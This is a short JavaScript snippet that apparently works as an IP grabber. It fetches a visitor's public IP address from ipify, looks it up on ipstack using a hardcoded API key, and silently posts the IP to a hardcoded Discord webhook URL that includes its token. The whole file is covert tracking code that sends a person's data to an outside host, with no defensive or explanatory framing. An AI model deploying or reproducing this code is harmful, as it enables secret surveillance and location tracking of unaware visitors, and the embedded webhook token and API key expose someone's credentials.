var ip = '';
fetch('https://api.ipify.org/?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    ip = data.ip;

    var webhook = 'https://discord.com/api/webhooks/1125398137218007120/48qobW7VH4WQVumwcZZ4Lqy-cVIhOlNVJ4yg6FEVR7qFxpIhfSUDYCot07T_0icdh0WY';
    
    fetch('http://api.ipstack.com/' + ip + '?access_key=f7f955d968dde57ba2e99e5edef897ba')
      .then(function(response) {
        return response.json();
      })
      .then(function(locationData) {
        var message = {
          content: '**__IPv6:__** ' + ip
        };

        fetch(webhook, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(message)
        });
      });
  });
